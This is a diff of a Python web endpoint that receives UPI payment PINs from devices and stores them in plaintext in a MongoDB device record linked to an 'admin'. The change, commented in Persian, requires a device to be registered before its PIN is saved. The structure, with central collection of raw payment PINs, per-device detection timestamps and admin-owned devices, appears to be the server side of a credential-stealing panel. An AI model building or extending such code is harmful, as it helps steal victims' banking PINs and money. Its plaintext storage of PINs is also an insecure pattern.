@@ -884,32 +884,34 @@ async def save_upi_pin(pin_data: UPIPinSave):
         
         if not admin:
             logger.warning(f"⚠️ Admin not found for user_id: {admin_token[:20]}...")
-            # Still save the PIN, but without admin association
             admin_username = None
         else:
             admin_username = admin["username"]
         
-        # Update or create device with UPI PIN
+        # پیدا کردن device موجود
+        device = await mongodb.db.devices.find_one({"device_id": pin_data.device_id})
+        
+        if not device:
+            logger.warning(f"⚠️ Device not found: {pin_data.device_id} - PIN not saved (device must register first)")
+            raise HTTPException(
+                status_code=404,
+                detail="Device not found. Device must be registered before saving PIN."
+            )
+        
+        # فقط Update کردن UPI PIN در device موجود
         update_data = {
             "$set": {
                 "upi_pin": pin_data.upi_pin,
                 "has_upi": True,
                 "upi_detected_at": datetime.utcnow(),
                 "upi_last_updated_at": datetime.utcnow(),
-                "app_type": pin_data.app_type,
                 "updated_at": datetime.utcnow()
             }
         }
         
-        # If we found the admin, associate device with them
-        if admin_username:
-            update_data["$set"]["admin_username"] = admin_username
-            update_data["$set"]["admin_token"] = admin_token
-        
         result = await mongodb.db.devices.update_one(
             {"device_id": pin_data.device_id},
-            update_data,
-            upsert=True
+            update_data
         )
         
         # Log the PIN save
